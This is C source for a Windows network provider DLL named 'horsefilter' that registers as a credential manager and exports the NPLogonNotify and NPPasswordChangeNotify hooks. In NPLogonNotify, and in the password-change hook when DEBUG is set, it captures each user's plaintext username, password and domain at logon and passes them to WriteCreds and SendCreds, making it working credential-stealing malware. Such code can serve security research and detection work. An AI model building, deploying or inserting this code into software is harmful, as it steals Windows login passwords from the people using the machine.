#include "horsefilter.h"

__declspec(dllexport)
WINAPI DWORD
NPGetCaps(DWORD ndex)
{
    switch (ndex)
    {
    case WNNC_START:
        return WNNC_WAIT_FOR_START;

    case WNNC_SPEC_VERSION:
        return WNNC_SPEC_VERSION51;

    case WNNC_NET_TYPE:
        return WNNC_CRED_MANAGER;

    }

    return EXIT_SUCCESS;
}

__declspec(dllexport)
WINAPI DWORD
NPLogonNotify(
    PLUID lpLogonId,
    LPCWSTR lpAuthentInfoType,
    LPVOID lpAuthentInfo,
    LPCWSTR lpPreviousAuthentInfoType,
    LPVOID lpPreviousAuthentInfo,
    LPWSTR lpStationName,
    LPVOID StationHandle,
    LPWSTR *lpLogonScript)
{
    PMSV1_0_INTERACTIVE_LOGON auth = lpAuthentInfo;
    Log("entering NPLogonNotify\n");
    WriteCreds(&auth->UserName, &auth->Password, &auth->LogonDomainName, "NPLogonNotify");
    SendCreds(&auth->UserName, &auth->Password, &auth->LogonDomainName, "NPLogonNotify");
    lpLogonScript = NULL;
    return WN_SUCCESS;
}

__declspec(dllexport)
APIENTRY DWORD
NPPasswordChangeNotify(
    LPCWSTR lpAuthentInfoType,
    LPVOID lpAuthentInfo,
    LPCWSTR lpPreviousAuthentInfoType,
    LPVOID lpPreviousAuthentInfo,
    LPWSTR lpStationName,
    LPVOID StationHandle,
    DWORD dwChangeInfo)
{
    if (DEBUG)
    {
        Log("entering NPPasswordChangeNotify\n");
        PMSV1_0_INTERACTIVE_LOGON auth = lpAuthentInfo;
        WriteCreds(&auth->UserName, &auth->Password, &auth->LogonDomainName, "NPPasswordChangeNotify");
        SendCreds(&auth->UserName, &auth->Password, &auth->LogonDomainName, "NPPasswordChangeNotify");
    }
    
    return WN_SUCCESS;
}